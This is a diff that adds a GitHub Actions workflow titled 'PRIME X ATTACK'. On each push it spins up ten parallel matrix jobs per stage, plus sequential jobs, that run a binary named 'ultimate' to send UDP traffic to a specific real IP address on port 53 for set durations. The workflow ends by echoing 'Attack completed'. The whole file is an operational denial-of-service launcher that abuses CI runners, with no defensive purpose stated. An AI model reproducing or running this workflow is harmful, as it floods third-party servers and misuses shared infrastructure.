@@ -1,0 +1,55 @@
+name: PRIME X ATTACK
+on: [push]
+
+jobs:
+  stage-0-init:
+    runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10]
+    steps:
+      - uses: actions/checkout@v3
+      - run: chmod +x ultimate
+      - run: ./ultimate udp 200.40.36.1 53 10 1500
+
+  stage-1-main:
+    needs: stage-0-init
+    runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10]
+    steps:
+      - uses: actions/checkout@v3
+      - run: chmod +x ultimate
+      - run: ./ultimate udp 200.40.36.1 53 120 1500
+
+  stage-2-calc:
+    runs-on: ubuntu-latest
+    outputs:
+      matrix_list: ${{ steps.calc.outputs.matrix_list }}
+    steps:
+      - id: calc
+        run: |
+          NUM_JOBS=$((120 / 10))
+          if [ $NUM_JOBS -lt 1 ]; then NUM_JOBS=1; fi
+          ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
+          echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT
+
+  stage-2-sequential:
+    needs: [stage-0-init, stage-2-calc]
+    runs-on: ubuntu-22.04
+    strategy:
+      max-parallel: 1
+      matrix:
+        iteration: ${{ fromJson(needs.stage-2-calc.outputs.matrix_list) }}
+    steps:
+      - uses: actions/checkout@v3
+      - run: chmod +x ultimate
+      - run: ./ultimate udp 200.40.36.1 53 10 1500
+
+  stage-3-cleanup:
+    needs: [stage-1-main, stage-2-sequential]
+    runs-on: ubuntu-22.04
+    if: always()
+    steps:
+      - run: echo "Attack completed on $(date)"
